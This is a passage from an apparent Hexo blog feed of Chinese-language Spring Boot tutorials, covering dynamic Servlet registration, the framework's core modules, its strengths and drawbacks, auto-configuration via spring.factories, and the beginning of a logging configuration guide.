aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Listener 配置方式类似，上面的示例代码一看就懂，这里不再详述。</p><p>需要注意的是，为了安全考虑，内嵌服务器不会直接执行 Servlet 3.0 里面的 <code>javax.servlet.ServletContainerInitializer</code> 接口，或者 Spring 中的 <code>org.springframework.web.WebApplicationInitializer</code> 接口，否则会导致终止 Spring Boot 应用。</p><p>所以，如果使用的是 Spring Boot 内嵌服务器，需要在配置类上面添加额外的 <code>@ServletComponentScan</code> 注解来开启 Servlet 组件扫描功能，如果使用的是独立的服务器，则不需要添加，会使用服务器内部的自动发现机制。</p><h2 id="三、动态注册"><a href="#三、动态注册" class="headerlink" title="三、动态注册"></a>三、动态注册</h2><p>如果你想在 Spring Boot 中完成 Servlet、Filter、Listener 的初始化操作，你需要在 Spring 中实现下面这个接口，并注册为一个 bean。</p><blockquote><p>org.springframework.boot.web.servlet.ServletContextInitializer</p></blockquote><p>ServletContext 提供了几个动态注册的方法，如下所示。</p><p><img src="http://img.javastack.cn/18-8-28/86108280.jpg"></p><p>以下为动态添加 Servlet 示例代码。</p><pre class="line-numbers language-none"><code class="language-none">import javax.servlet.annotation.WebInitParam;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;&#x2F;** *  *&#x2F;@WebServlet(name &#x3D; &quot;javaServlet&quot;, urlPatterns &#x3D; &quot;&#x2F;javastack.cn&quot;, asyncSupported &#x3D; true,initParams &#x3D; &#123;@WebInitParam(name &#x3D; &quot;name&quot;, value &#x3D; &quot;javastack&quot;),@WebInitParam(name &#x3D; &quot;sex&quot;, value &#x3D; &quot;man&quot;) &#125;)public class JavaServlet extends HttpServlet &#123;@Overrideprotected void service(HttpServletRequest req, HttpServletResponse resp) throws IOException &#123;String name &#x3D; getServletConfig().getInitParameter(&quot;name&quot;);String sex &#x3D; getServletConfig().getInitParameter(&quot;sex&quot;);resp.getOutputStream().println(&quot;name is &quot; + name);resp.getOutputStream().println(&quot;sex is &quot; + sex);&#125;&#125;import cn.javastack.springbootbestpractice.servlet.InitServlet;import org.springframework.boot.web.servlet.ServletContextInitializer;import org.springframework.stereotype.Component;import javax.servlet.ServletContext;import javax.servlet.ServletRegistration;&#x2F;** *  *&#x2F;@Componentpublic class ServletConfig implements ServletContextInitializer &#123;@Overridepublic void onStartup(ServletContext servletContext) &#123;ServletRegistration initServlet &#x3D; servletContext.addServlet(&quot;initServlet&quot;, InitServlet.class);initServlet.addMapping(&quot;&#x2F;initServlet&quot;);initServlet.setInitParameter(&quot;name&quot;, &quot;javastack&quot;);initServlet.setInitParameter(&quot;sex&quot;, &quot;man&quot;);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文介绍了在 Spring Boot 下的 3 种注册 Servlet、Filter、Listener 的方式，大家灵活运用。</p><p>看完有收获，点赞转发一下吧！</p><ul><li>Spring Boot 读取配置的几种方式</li><li>Spring Boot 如何做参数校验？</li><li>Spring Boot 最核心的 25 个注解！</li><li>Spring Boot 2.x 启动全过程源码分析</li><li>Spring Boot 2.x 新特性总结及迁移指南</li><li>……</li></ul><p><img src="http://img.javastack.cn/wx_search_javastack.png"></p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 的 10 个核心模块</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E7%9A%84%2010%20%E4%B8%AA%E6%A0%B8%E5%BF%83%E6%A8%A1%E5%9D%97/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E7%9A%84%2010%20%E4%B8%AA%E6%A0%B8%E5%BF%83%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<p>学习 Spring Boot 必须得了解它的核心模块，和 Spring 框架一样，Spring Boot 也是一个庞大的项目，也是由许多核心子模块组成的。</p><h2 id="Spring-Boot-的核心模块"><a href="#Spring-Boot-的核心模块" class="headerlink" title="Spring Boot 的核心模块"></a>Spring Boot 的核心模块</h2><p>下面我们大概来了解一下 Spring Boot 的核心模块。</p><p><strong>1、spring-boot</strong></p><p>这是 Spring Boot 的主模块，也是支持其他模块的核心模块，主要包含以下几点：</p><ol><li><p>提供了一个启动 Spring 应用的主类，并提供了一个相当方便的静态方法，它的主要是作用是负责创建和刷新 Spring 容器的上下文；</p></li><li><p>内嵌式的并可自由选择搭配的 WEB 应用容器，如：<code>Tomcat</code>, <code>Jetty</code>, <code>Undertow</code>等；</p></li><li><p>对配置外部化的支持；</p></li><li><p>提供一个很方便的 Spring 容器上下文初始化器，包括合理记录日志默认参数的支持。</p></li></ol><p><strong>2、spring-boot-autoconfigure</strong></p><p>Spring Boot能根据类路径下的内容自动一些公共大型应用，提供的 <code>@EnableAutoConfiguration</code> 注解就能启用 Spring 功能的自动配置。</p><p>自动配置功能可以推断用户可能需要加载哪些 Spring Bean, 如：如果类路径下有 <code>HicariCP</code> 这个连接池的包，此时并未提供任何有效连接池的配置，那么 Spring Boot 就知道你可能需要一个连接池，并做相应配置。如果用户配置了其他连接池，那么 Spring Boot 会放弃自动配置。</p><p><strong>3、spring-boot-starters</strong></p><p>Starters，我们叫它启动器好了，它是包括一系列依赖的描述符。简单的说就是，它可以一站式的帮你打包 Spring 及相关技术应用，而不需要你到处找依赖和示例配置代码，它都帮你做好了。</p><p>例如，第一章我们在介绍 Spring Boot 的时候就说了 <code>spring-boot-starter-web</code> 这个启动器，你只要引用了这个启动器应用，就会自动配置 WEB 应用的能力。</p><p><code>spring-boot-starters</code> 这个启动器这主要提供了 <code>spring-boot</code>, <code>spring-context</code>, <code>spring-beans</code> 这三个 Spring 模块而已。</p><p><strong>4、spring-boot-cli</strong></p><p>这是 Spring Boot 的命令行工具，用于编译和运行 <code>Groovy</code> 源程序，可以十分简单的编写并运行一个应用程序。它也能监控你的文件，一旦有变动就会自动重新编译和重新启动应用程序。</p><p><strong>5、spring-boot-actuator</strong></p><p>这是 Spring Boot 提供的执行端点，你可以更好的监控及和你的应用程序交互。这个模块提供了像健康端点、环境端点、Spring Bean端点等。</p><p><strong>6、spring-boot-actuator-autoconfigure</strong></p><p>这个原理同上，为 Spring Boot 执行端点提供自动配置。</p><p><strong>7、spring-boot-test</strong></p><p>Spring Boot测试模块，为应用测试提供了许多非常有用的核心功能。</p><p><strong>8、spring-boot-test-autoconfigure</strong></p><p>这个原理同上，为 Spring Boot 测试模块提供自动配置。</p><p><strong>9、spring-boot-loader</strong></p><p>这个模块可以用来构建一个单独可执行的 jar 包，使用 <code>java -jar</code> 就能直接运行。一般不会直接使用这个来打包，使用 Spring Boot 提供的 Maven 或者 Gradle 插件就行了。</p><p><strong>10、spring-boot-devtools</strong></p><p>开发者工具模块，主要为 Spring Boot 开发阶段提供一些特性，如修改了代码自动重启应用等。这个模块的功能是可选的，只限于本地开发阶段，当打成整包运行时这些功能会被禁用。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 真是个牛逼货！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E7%9C%9F%E6%98%AF%E4%B8%AA%E7%89%9B%E9%80%BC%E8%B4%A7%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E7%9C%9F%E6%98%AF%E4%B8%AA%E7%89%9B%E9%80%BC%E8%B4%A7%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>现在 Spring Boot 非常火，各种技术文章，各种付费教程，多如牛毛，可能还有些不知道 Spring Boot 的，那它到底是什么呢？有什么用？今天给大家详细介绍一下。</p><h2 id="Spring-Boot-的背景"><a href="#Spring-Boot-的背景" class="headerlink" title="Spring Boot 的背景"></a>Spring Boot 的背景</h2><p>了解 Spring Boot 必须先说说 Spring 框架！</p><p>在 Java 后端框架繁荣的今天，Spring 框架无疑是最最火热，也是必不可少的开源框架，更是稳坐 Java 后端框架的龙头老大。</p><p>用过 Spring 框架的都知道 Spring 能流行是因为它的两把利器：IOC 和 AOP，IOC 可以帮助我们管理对象的依赖关系，极大减少对象的耦合性，而 AOP 的切面编程功能可以更方面的使用动态代理来实现各种动态方法功能（如事务、缓存、日志等）。</p><p>而要集成 Spring 框架，必须要用到 XML 配置文件，或者注解式的 Java 代码配置。无论是使用 XML 或者代码配置方式，都需要对相关组件的配置有足够的了解，然后再编写大量冗长的配置代码。</p><p>然后又有多少开发人员能精通这些配置呢？如果我们只提供一些配置参数让框架能自动配置这些组件，那是不是 so easy?</p><p>基于简化 Spring 快速上手为目的，Spring Boot 框架诞生了！</p><h2 id="什么是-Spring-Boot"><a href="#什么是-Spring-Boot" class="headerlink" title="什么是 Spring Boot?"></a>什么是 Spring Boot?</h2><p>Spring Boot是 Spring 开源组织下的一个子项目，也是 Spring 组件一站式解决方案，主要是为了简化使用 Spring 框架的难度，简省繁重的配置。</p><p>Spring Boot提供了各种组件的启动器（starters），开发者只要能配置好对应组件参数，Spring Boot 就会自动配置，让开发者能快速搭建依赖于 Spring 组件的 Java 项目。</p><p>Spring Boot不但能创建传统的 war 包应用，还能创建独立的不依赖于任何外部容器（如：tomcat）的独立应用，使用 <code>java -jar</code> 命令就能启动。同时，Spring Boot也提供了一个命令行工具来执行 Spring 的脚本。</p><p>Spring Boot 的官方网站：</p><blockquote><p><a href="https://projects.spring.io/spring-boot/">https://projects.spring.io/spring-boot/</a></p></blockquote><p>Spring Boot 的源码：</p><blockquote><p><a href="https://github.com/spring-projects/spring-boot">https://github.com/spring-projects/spring-boot</a></p></blockquote><h2 id="Spring-Boot-的设计目标"><a href="#Spring-Boot-的设计目标" class="headerlink" title="Spring Boot 的设计目标"></a>Spring Boot 的设计目标</h2><p>如果你不清楚 Spring 是干嘛用的，那再来看看设计它的目标和初衷是什么！</p><ul><li>为 Spring 应用开发提供一个更快、更容易上手的入门体验；</li><li>提供一系列在大型项目中经常用到的公共的非功能性特性，如：内嵌入服务器、安全、度量指标、健康检测、外部化配置；</li><li>零代码配置生成及零 XML 配置；</li></ul><h2 id="Spring-Boot-为什么能这么火？"><a href="#Spring-Boot-为什么能这么火？" class="headerlink" title="Spring Boot 为什么能这么火？"></a>Spring Boot 为什么能这么火？</h2><p>Spring Boot 为什么能这么火？是因为它有以下几个特色。</p><p><strong>1、独立运行</strong></p><p>Spring Boot内嵌了各种 Servlet 容器，Tomcat、Jetty等，现在不再需要打成 war 包部署到容器中，Spring Boot 只要打成一个可执行的jar包就能独立运行，所有的依赖包都在一个 jar 包内。</p><p><strong>2、简化 Maven 配置</strong></p><p><img src="http://img.javastack.cn/18-5-3/97561296.jpg"></p><p>如上图所示，现在只要依赖 <code>spring-boot-starter-web</code> 启动器包，它包含所有 web 开发所有的依赖，就能拥有 Spring Web 的能力，极大简少了 maven 对依赖的配置。</p><p>使用 Maven 命令：<code>mvn dependency:tree</code> 也可以看到完整的依赖树：</p><pre class="line-numbers language-none"><code class="language-none">[INFO] +- org.springframework.boot:spring-boot-starter-web:jar:2.0.1.RELEASE:compile[INFO] |  +- org.springframework.boot:spring-boot-starter:jar:2.0.1.RELEASE:compile[INFO] |  |  +- org.springframework.boot:spring-boot:jar:2.0.1.RELEASE:compile[INFO] |  |  +- org.springframework.boot:spring-boot-autoconfigure:jar:2.0.1.RELEASE:compile[INFO] |  |  +- org.springframework.boot:spring-boot-starter-logging:jar:2.0.1.RELEASE:compile[INFO] |  |  |  +- ch.qos.logback:logback-classic:jar:1.2.3:compile[INFO] |  |  |  |  \- ch.qos.logback:logback-core:jar:1.2.3:compile[INFO] |  |  |  +- org.apache.logging.log4j:log4j-to-slf4j:jar:2.10.0:compile[INFO] |  |  |  |  \- org.apache.logging.log4j:log4j-api:jar:2.10.0:compile[INFO] |  |  |  \- org.slf4j:jul-to-slf4j:jar:1.7.25:compile[INFO] |  |  +- javax.annotation:javax.annotation-api:jar:1.3.2:compile[INFO] |  |  \- org.yaml:snakeyaml:jar:1.19:runtime[INFO] |  +- org.springframework.boot:spring-boot-starter-json:jar:2.0.1.RELEASE:compile[INFO] |  |  +- com.fasterxml.jackson.core:jackson-databind:jar:2.9.5:compile[INFO] |  |  |  +- com.fasterxml.jackson.core:jackson-annotations:jar:2.9.0:compile[INFO] |  |  |  \- com.fasterxml.jackson.core:jackson-core:jar:2.9.5:compile[INFO] |  |  +- com.fasterxml.jackson.datatype:jackson-datatype-jdk8:jar:2.9.5:compile[INFO] |  |  +- com.fasterxml.jackson.datatype:jackson-datatype-jsr310:jar:2.9.5:compile[INFO] |  |  \- com.fasterxml.jackson.module:jackson-module-parameter-names:jar:2.9.5:compile[INFO] |  +- org.springframework.boot:spring-boot-starter-tomcat:jar:2.0.1.RELEASE:compile[INFO] |  |  +- org.apache.tomcat.embed:tomcat-embed-core:jar:8.5.29:compile[INFO] |  |  +- org.apache.tomcat.embed:tomcat-embed-el:jar:8.5.29:compile[INFO] |  |  \- org.apache.tomcat.embed:tomcat-embed-websocket:jar:8.5.29:compile[INFO] |  +- org.hibernate.validator:hibernate-validator:jar:6.0.9.Final:compile[INFO] |  |  +- javax.validation:validation-api:jar:2.0.1.Final:compile[INFO] |  |  +- org.jboss.logging:jboss-logging:jar:3.3.2.Final:compile[INFO] |  |  \- com.fasterxml:classmate:jar:1.3.4:compile[INFO] |  +- org.springframework:spring-web:jar:5.0.5.RELEASE:compile[INFO] |  |  \- org.springframework:spring-beans:jar:5.0.5.RELEASE:compile[INFO] |  \- org.springframework:spring-webmvc:jar:5.0.5.RELEASE:compile[INFO] |     +- org.springframework:spring-aop:jar:5.0.5.RELEASE:compile[INFO] |     +- org.springframework:spring-context:jar:5.0.5.RELEASE:compile[INFO] |     \- org.springframework:spring-expression:jar:5.0.5.RELEASE:compile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3、自动配置</strong></p><p>Spring Boot能根据当前类路径下的类或者 jar 包里面来的类来自动配置 Spring Bean，如添加一个 <code>spring-boot-starter-web</code> 启动器就能拥有 web 的功能，无需其他配置。也可以在配置文件中添加相关配置来自定义装配，这个后面的课程会讲到，请关注后续内容。</p><p><strong>4、无代码生成和XML配置</strong></p><p>Spring Boot配置过程中无代码生成，也无需XML配置文件就能完成所有配置工作，这一切都是借助于条件注解完成的，这也是 Spring 4+ 的核心功能之一。</p><p><strong>5、应用监控</strong></p><p>Spring Boot提供一系列端点可以监控服务及应用，能对Spring 应用做健康检测。</p><h2 id="Spring-Boot-的缺点"><a href="#Spring-Boot-的缺点" class="headerlink" title="Spring Boot 的缺点"></a>Spring Boot 的缺点</h2><p>说了这么多 Spring Boot 的优点和特色，虽然上手很容易，但也不是没有缺点。任何框架都有其优缺点，Spring Boot 也不例外，我大概可以总结有以下几个缺点。</p><p>1、需要非常了解 Spring Boot 的核心技术原理，不然一旦遇到问题就很棘手。因为什么东西都集成了，自动配置化。这样，需要对配置信息非常熟悉，要找起问题来不是很容易。</p><p>2、从原始 Spring 项目很难平滑迁移至 Spring Boot 框架上来，因为有些历史老旧的 XML 配置无法通过 Java 来配置，还需要额外的 XML 文件就不是很完美。再比如，之前是独立的 Tomcat，什么参数都在线上配置好了，你改为内置的 Tomcat 就会遇到很多问题。</p><p>相对于优点来说，这些缺点也都不算什么。总之，Spring Boot 是值得我们任何一个 Java 开发者尝试摸索的。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 自动配置原理、实战</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE%E5%8E%9F%E7%90%86%E3%80%81%E5%AE%9E%E6%88%98/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE%E5%8E%9F%E7%90%86%E3%80%81%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h2 id="Spring-Boot自动配置原理"><a href="#Spring-Boot自动配置原理" class="headerlink" title="Spring Boot自动配置原理"></a>Spring Boot自动配置原理</h2><p>Spring Boot的自动配置注解是@EnableAutoConfiguration，<br>从上面的@Import的类可以找到下面自动加载自动配置的映射。</p><pre class="line-numbers language-none"><code class="language-none">org.springframework.core.io.support.SpringFactoriesLoader.loadFactoryNames(Class&lt;?&gt;, ClassLoader)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">public static List&lt;String&gt; loadFactoryNames(Class&lt;?&gt; factoryClass, ClassLoader classLoader) &#123;String factoryClassName &#x3D; factoryClass.getName();try &#123;Enumeration&lt;URL&gt; urls &#x3D; (classLoader !&#x3D; null ? classLoader.getResources(FACTORIES_RESOURCE_LOCATION) :lassLoader.getSystemResources(FACTORIES_RESOURCE_LOCATION));List&lt;String&gt; result &#x3D; new ArrayList&lt;String&gt;();while (urls.hasMoreElements()) &#123;URL url &#x3D; urls.nextElement();Properties properties &#x3D; PropertiesLoaderUtils.loadProperties(new UrlResource(url));String factoryClassNames &#x3D; properties.getProperty(factoryClassName);result.addAll(Arrays.asList(StringUtils.commaDelimitedListToStringArray(factoryClassNames)));&#125;return result;&#125;catch (IOException ex) &#123;throw new IllegalArgumentException(&quot;Unable to load [&quot; + factoryClass.getName() +&quot;] factories from location [&quot; + FACTORIES_RESOURCE_LOCATION + &quot;]&quot;, ex);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个方法会加载类路径及所有jar包下META-INF&#x2F;spring.factories配置中映射的自动配置的类。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** * The location to look for factories. * &lt;p&gt;Can be present in multiple JAR files. *&#x2F;public static final String FACTORIES_RESOURCE_LOCATION &#x3D; &quot;META-INF&#x2F;spring.factories&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看Spring Boot自带的自动配置的包：<br>spring-boot-autoconfigure-1.5.6.RELEASE.jar，打开其中的META-INF&#x2F;spring.factories文件会找到自动配置的映射。</p><pre class="line-numbers language-none"><code class="language-none"># Auto Configureorg.springframework.boot.autoconfigure.EnableAutoConfiguration&#x3D;\org.springframework.boot.autoconfigure.admin.SpringApplicationAdminJmxAutoConfiguration,\org.springframework.boot.autoconfigure.aop.AopAutoConfiguration,\org.springframework.boot.autoconfigure.amqp.RabbitAutoConfiguration,\org.springframework.boot.autoconfigure.batch.BatchAutoConfiguration,\org.springframework.boot.autoconfigure.cache.CacheAutoConfiguration,\org.springframework.boot.autoconfigure.cassandra.CassandraAutoConfiguration,\org.springframework.boot.autoconfigure.cloud.CloudAutoConfiguration,\...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再来看看数据源自动配置的实现注解</p><pre class="line-numbers language-none"><code class="language-none">@Configuration@ConditionalOnClass(&#123; DataSource.class, EmbeddedDatabaseType.class &#125;)@EnableConfigurationProperties(DataSourceProperties.class)@Import(&#123; Registrar.class, DataSourcePoolMetadataProvidersConfiguration.class &#125;)public class DataSourceAutoConfiguration &#123;...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>@Configuration,@ConditionalOnClass就是自动配置的核心，首先它得是一个配置文件，其次根据类路径下是否有这个类去自动配置。</p><h2 id="自动配置实战"><a href="#自动配置实战" class="headerlink" title="自动配置实战"></a>自动配置实战</h2><p>所以，了解了自动配置的原理，来自己实现一个自动配置的玩意其实很简单。</p><p>添加配置类：</p><pre class="line-numbers language-none"><code class="language-none">public class EnvConfig implements EnvironmentAware &#123;private final Logger logger &#x3D; LoggerUtils.getLogger(this);private Environment env;public String getStringValue(String key) &#123;return env.getProperty(key);&#125;public Long getLongValue(String key) &#123;String value &#x3D; getStringValue(key);try &#123;return Long.parseLong(value);&#125; catch (Exception e) &#123;logger.error(&quot;字符串转换Long失败：&#123;&#125; &#x3D; &#123;&#125;&quot;, key, value);&#125;return 0L;&#125;public int getIntValue(String key) &#123;return getLongValue(key).intValue();&#125;@Overridepublic void setEnvironment(Environment environment) &#123;this.env &#x3D; environment;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>添加自动配置类：</p><pre class="line-numbers language-none"><code class="language-none">import org.springframework.boot.autoconfigure.condition.ConditionalOnClass;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.core.env.PropertyResolver;@Configuration@ConditionalOnClass(PropertyResolver.class)public class EnvAutoConfig &#123;@Beanpublic EnvConfig envConfig() &#123;return new EnvConfig();&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建META-INF&#x2F;spring.factories文件，添加自动配置映射：</p><pre class="line-numbers language-none"><code class="language-none">org.springframework.boot.autoconfigure.EnableAutoConfiguration&#x3D;\\cn.javastack.config.EnvAutoConfig<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这样就搞定了。</p><h2 id="查看自动配置报告"><a href="#查看自动配置报告" class="headerlink" title="查看自动配置报告"></a>查看自动配置报告</h2><p>怎么查看自己加的自动配置类有没有被加载，或者查看所有自动配置激活的和未激活的可以通过以下几种试查看。</p><p>1、spring-boot:run运行的在对话框Enviroment中加入debug&#x3D;true变量 <br>2、java -jar xx.jar –debug<br>3、main方法运行，在VM Argumanets加入-Ddebug<br>4、直接在application文件中加入debug&#x3D;true<br>5、如果集成了spring-boot-starter-actuator监控，通过autoconfig端点也可以查看。</p><p>启动后会在控制台看到以下自动配置报告信息：</p><pre class="line-numbers language-none"><code class="language-none">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;AUTO-CONFIGURATION REPORT&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Positive matches:-----------------   AopAutoConfiguration matched:      - @ConditionalOnClass found required classes &#39;org.springframework.context.annotation.EnableAspectJAutoProxy&#39;, &#39;org.aspectj.lang.annotation.Aspect&#39;, &#39;org.aspectj.lang.reflect.Advice&#39;; @ConditionalOnMissingClass did not find unwanted class (OnClassCondition)      - @ConditionalOnProperty (spring.aop.auto&#x3D;true) matched (OnPropertyCondition)     ...   EnvAutoConfig matched:      - @ConditionalOnClass found required class &#39;org.springframework.core.env.PropertyResolver&#39;; @ConditionalOnMissingClass did not find unwanted class (OnClassCondition)   ErrorMvcAutoConfiguration matched:      - @ConditionalOnClass found required classes &#39;javax.servlet.Servlet&#39;, &#39;org.springframework.web.servlet.DispatcherServlet&#39;; @ConditionalOnMissingClass did not find unwanted class (OnClassCondition)      - @ConditionalOnWebApplication (required) found StandardServletEnvironment (OnWebApplicationCondition)   ErrorMvcAutoConfiguration#basicErrorController matched:      - @ConditionalOnMissingBean (types: org.springframework.boot.autoconfigure.web.ErrorController; SearchStrategy: current) did not find any beans (OnBeanCondition)   ...Negative matches:-----------------   ActiveMQAutoConfiguration:      Did not match:         - @ConditionalOnClass did not find required classes &#39;javax.jms.ConnectionFactory&#39;, &#39;org.apache.activemq.ActiveMQConnectionFactory&#39; (OnClassCondition)   AopAutoConfiguration.JdkDynamicAutoProxyConfiguration:      Did not match:         - @ConditionalOnProperty (spring.aop.proxy-target-class&#x3D;false) found different value in property &#39;proxy-target-class&#39; (OnPropertyCondition)   ArtemisAutoConfiguration:      Did not match:         - @ConditionalOnClass did not find required classes &#39;javax.jms.ConnectionFactory&#39;, &#39;org.apache.activemq.artemis.jms.client.ActiveMQConnectionFactory&#39; (OnClassCondition)   BatchAutoConfiguration:      Did not match:         - @ConditionalOnClass did not find required class &#39;org.springframework.batch.core.launch.JobLauncher&#39; (OnClassCondition)    ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Positive matches：已经启用的自动配置<br>Negative matches：未启用的自动配置</p><p>从报告中看到自己添加的EnvAutoConfig已经自动配置了。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 自定义日志详解</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E8%87%AA%E5%AE%9A%E4%B9%89%E6%97%A5%E5%BF%97%E8%AF%A6%E8%A7%A3/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E8%87%AA%E5%AE%9A%E4%B9%89%E6%97%A5%E5%BF%97%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>本节内容基于 Spring Boot 2.0.</p><h2 id="Spring-Boot-日志综合介绍"><a href="#Spring-Boot-日志综合介绍" class="headerlink" title="Spring Boot 日志综合介绍"></a>Spring Boot 日志综合介绍</h2><p>Spring Boot 内部代码使用的是 <code>commons-logging</code> 来记录日志的，但是底层日志实现框架是可以随意替换的。Spring Boot为 <code>Java Util Logging</code>, <code>Log4J2</code>, 和 <code>Logback</code> 日志框架提供了默认配置。</p><p>Spring Boot支持的日志框架默认配置如下。</p><pre class="line-numbers language-none"><code class="language-none"># LOGGINGlogging.config&#x3D; # Location of the logging configuration file. For instance, &#96;classpath:logback.xml&#96; for Logback.logging.exception-conversion-word&#x3D;%wEx # Conversion word used when logging exceptions.logging.file&#x3D; # Log file name (for instance, &#96;myapp.log&#96;). Names can be an exact location or relative to the current directory.logging.file.max-history&#x3D;0 # Maximum of archive log files to keep. Only supported with the default logback setup.logging.file.max-size&#x3D;10MB # Maximum log file size. Only supported with the default logback setup.logging.level.*&#x3D; # Log levels severity mapping. For instance, &#96;logging.level.org.springframework&#x3D;DEBUG&#96;.logging.path&#x3D; # Location of the log file. For instance, &#96;&#x2F;var&#x2F;log&#96;.logging.pattern.console&#x3D; # Appender pattern for output to the console. Supported only with the default Logback setup.logging.pattern.dateformat&#x3D;yyyy-MM-dd HH:mm:ss.SSS # Appender pattern for log date format. Supported only with the default Logback setup.logging.pattern.file&#x3D; # Appender pattern for output to a file. Supported only with the default Logback setup.logging.pattern.level&#x3D;%5p # Appender pattern for log level. Supported only with the default Logback setup.logging.register-shutdown-hook&#x3D;false # Register a shutdown hook for the logging system when it is initialized.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果不配置以上任何参数，日志默认只会以 <code>INFO</code> 以上的级别打印在控制台，不会记录在日志文件中。</p><p>如果使用了任何 <code>Starters</code>，那 Spring Boot 默认会使用 